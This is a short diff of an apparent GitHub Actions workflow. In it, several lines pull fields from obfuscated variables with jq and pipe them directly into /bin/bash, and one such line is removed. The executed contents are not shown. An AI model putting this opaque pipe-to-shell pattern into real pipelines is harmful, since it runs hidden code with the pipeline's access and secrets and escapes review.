@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$sym7500" | jq -r .megx680 | /bin/bash
           echo $drt676 | jq -r .aprqq15384 | /bin/bash
           echo $ojjrt069 | jq -r .dlysl71 | /bin/bash
-          echo $jvr20165 | jq -r .o180 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
